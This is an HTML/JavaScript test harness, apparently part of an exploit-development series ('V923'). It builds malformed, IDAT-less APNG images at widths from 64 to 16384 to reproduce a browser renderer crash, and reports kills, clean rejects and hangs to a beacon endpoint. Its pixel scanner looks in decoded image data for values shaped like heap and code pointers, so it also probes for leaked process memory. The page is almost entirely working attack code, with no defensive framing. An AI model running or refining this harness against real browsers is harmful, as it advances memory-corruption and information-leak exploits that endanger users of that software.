<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V923</title></head>
<body><pre id="out">V923 — width sweep inside the kill signature: no-IDAT, kit-faithful delay (1/100), w in {64, 1024, 4096, 8192, 16384}</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
function bk(t,d){
  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V923-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,600))+'&t='+Date.now(),false);x.send(null);}catch(e){}
  O.textContent+='\n'+t+' '+(d===undefined?'':d);
}

/*
 * v923 — separates WIDTH from the missing-IDAT condition inside the v922
 * kill signature. v922: accepted APNG + no IDAT + fcTL/IHDR 16384x1 intact
 * + animation on => death, data-independent (M1 corrupt zlib still kills).
 * My v921 B1 (w=64, no IDAT) was REJECTED — but my build used fcTL
 * delay=0/10 vs the kit's 1/100, so the rejection was confounded. This
 * sweep rebuilds no-IDAT APNGs with kit-faithful fields (delay=1/100,
 * dispose=0, blend=0, num_frames=1, num_plays=0) at five widths:
 *
 *   W1 w=64    W2 w=1024   W3 w=4096   W4 w=8192   W5 w=16384
 *
 * All die            => missing-IDAT is the trigger (width irrelevant):
 *                       the frame pipeline derefs a missing/null default
 *                       image at a fixed site — characterize the site.
 * Death from some w onward => width-triggered; compute w*4 against 2^16 at
 *                       the threshold (16-bit truncation candidate).
 * None die (all rejected like my B1) => delay_num=0 was indeed the B1
 *                       rejection cause AND width=64 no-IDAT is genuinely
 *                       rejected — sweep upward to find where acceptance
 *                       begins.
 *
 * fdAT carries a VALID zlib stream of the full frame (w*4+1 raw) so any
 * acceptance reaches the same pipeline as the kit ctrl. One build per
 * load; deaths marked by pending; ?r=1 resets.
 */

var CRC_T=(function(){var t=[],c,n,k;for(n=0;n<256;n++){c=n;for(k=0;k<8;k++)c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1);t[n]=c>>>0;}return t;})();
function crc32(buf,start,end){var c=0xFFFFFFFF;for(var i=start;i<end;i++)c=(CRC_T[(c^buf[i])&0xFF]^(c>>>8))>>>0;return (c^0xFFFFFFFF)>>>0;}
function push32(a,v){a.push((v>>>24)&255,(v>>>16)&255,(v>>>8)&255,v&255);}
function chunk(out,type,data){var n=data.length,i;push32(out,n);var cs=out.length;for(i=0;i<4;i++)out.push(type.charCodeAt(i));for(i=0;i<n;i++)out.push(data[i]);var c=crc32(out,cs,out.length);push32(out,c);}
function zlibStored(raw){var out=[0x78,0x01],i=0;while(i<raw.length){var blk=raw.slice(i,Math.min(i+65535,raw.length));i+=blk.length;var last=(i>=raw.length)?1:0;out.push(last,blk.length&255,(blk.length>>8)&255,(~blk.length)&255,((~blk.length)>>8)&255);for(var j=0;j<blk.length;j++)out.push(blk[j]);}var a=1,b2=0;for(i=0;i<raw.length;i++){a=(a+raw[i])%65521;b2=(b2+a)%65521;}push32(out,((b2<<16)|a)>>>0);return out;}
function markerRows(w,h){var raw=[],y,x;for(y=0;y<h;y++){raw.push(0);for(x=0;x<w;x++){raw.push(0x41,0xAA,0x41,0xFF);}}return raw;}
function fctlKit(seq,w,h){ /* kit-faithful: delay=1/100, dispose=0, blend=0 */
  var d=[];push32(d,seq);push32(d,w);push32(d,h);push32(d,0);push32(d,0);d.push(0,1);d.push(0,100);d.push(0,0);return d;}
function buildNoIDAT(w){
  var out=[],sig=[137,80,78,71,13,10,26,10];for(var i=0;i<8;i++)out.push(sig[i]);
  var ih=[];push32(ih,w);push32(ih,1);ih.push(8,6,0,0,0);
  chunk(out,'IHDR',ih);
  var actl=[];push32(actl,1);push32(actl,0);
  chunk(out,'acTL',actl);
  chunk(out,'fcTL',fctlKit(0,w,1));
  chunk(out,'fdAT',fdatKit(1,w,1));
  chunk(out,'IEND',[]);
  return out;
}
function fdatKit(seq,w,h){var d=[];push32(d,seq);var z=zlibStored(markerRows(w,h));for(var i=0;i<z.length;i++)d.push(z[i]);return d;}
function toDataUrl(b){var s='';for(var i=0;i<b.length;i++)s+=String.fromCharCode(b[i]);return 'data:image/png;base64,'+btoa(s);}
function scanImage(img,nm){
  var cv=document.createElement('canvas');cv.width=img.width;cv.height=img.height;
  var g=cv.getContext('2d');g.drawImage(img,0,0);
  var id=g.getImageData(0,0,cv.width,cv.height);
  var d=new Uint8Array(id.data.buffer);
  var nz=0,heap=0,code=0,other=0,n=Math.min(d.length,65536);
  for(var i=0;i<n;i+=4){if(d[i]||d[i+1]||d[i+2]||d[i+3])nz++;}
  for(var j=0;j+8<=n;j+=8){
    var hiU=((d[j+7]<<24)|(d[j+6]<<16)|(d[j+5]<<8)|d[j+4])>>>0;
    if(hiU>=8&&hiU<=255)heap++;
    else if(hiU>=1&&hiU<=7)code++;
    else if(d[j]|d[j+1]|d[j+2]|d[j+3]|d[j+4]|d[j+5]|d[j+6]|d[j+7])other++;
  }
  return 'dims='+img.width+'x'+img.height+' nz4='+nz+' heap='+heap+' code='+code+' other8='+other;
}

var WIDTHS=[64,1024,4096,8192,16384];
var st={arm:0,pending:null};
try{
  if(location.search.indexOf('r=1')>=0){localStorage.removeItem('v923_state');bk('RESET','cleared');}
  else{var raw=localStorage.getItem('v923_state');if(raw)st=JSON.parse(raw);}
}catch(e){}
function save(){try{localStorage.setItem('v923_state',JSON.stringify(st));}catch(e){}}

if(st.pending){
  var pk=st.pending; st.pending=null; save();
  bk('KILLER','arm=W'+WIDTHS[pk.arm]+' — context died in frame decode (row banked)');
  st.arm=pk.arm+1; save();
}

if(st.arm>=WIDTHS.length){
  bk('EXHAUSTED','width sweep complete: killers vs clean-rejects split width from missing-IDAT');
}else{
  var w=WIDTHS[st.arm];
  var bytes=buildNoIDAT(w);
  bk('BOOT','arm=W'+w+'|noIDAT|delay=1/100|bytes='+bytes.length);
  st.pending={arm:st.arm}; save();
  bk('ATTEMPT-PRE','arm=W'+w+' (sync — the next event is decode/scan or the death)');
  var img=new Image();
  var killed=false;
  var to=setTimeout(function(){ if(killed)return; killed=true;
    bk('LOADTO','hang: W'+w); st.pending=null; st.arm++; save();
    setTimeout(function(){location.reload();},300);
  },6500);
  img.onload=function(){ clearTimeout(to); if(killed)return; killed=true;
    st.pending=null; save();
    try{ bk('LOADED','arm=W'+w+' | '+scanImage(img,'W'+w)); }catch(e){ bk('SCAN-ERR',e.name); }
    st.arm++; save();
    setTimeout(function(){location.reload();},300);
  };
  img.onerror=function(){ clearTimeout(to); if(killed)return; killed=true;
    st.pending=null; st.arm++; save();
    bk('DECODE-ERR','arm=W'+w+' (rejected cleanly — context alive)');
    setTimeout(function(){location.reload();},300);
  };
  img.src=toDataUrl(bytes);
}
</script></body></html>
